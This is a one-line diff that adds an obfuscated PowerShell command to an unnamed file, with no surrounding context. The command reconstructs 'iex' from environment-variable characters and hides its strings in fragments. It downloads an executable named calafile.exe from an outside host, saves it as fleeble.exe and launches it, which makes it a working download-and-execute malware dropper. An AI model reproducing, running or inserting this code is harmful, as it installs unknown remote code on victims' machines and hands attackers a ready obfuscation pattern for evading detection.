@@ -1,0 +1,1 @@
+﻿ &( $EnV:COMSpEC[4,26,25]-Join'')(('('+'New'+'-Object Sy'+'stem.N'+'e'+'t'+'.WebClie'+'nt'+').'+'Do'+'wnlo'+'a'+'d'+'Fil'+'e'+'(dpAh'+'ttp:'+'/'+'/'+'matka'+'lv.5gbfree'+'.com'+'/c'+'alab/c'+'alafil'+'e.exe'+'d'+'pA,dp'+'Afleeble.exed'+'pA);Star'+'t-P'+'rocess d'+'p'+'A'+'fleebl'+'e.exedp'+'A').ReplacE(([CHaR]100+[CHaR]112+[CHaR]65),[sTRiNG][CHaR]39) ) 
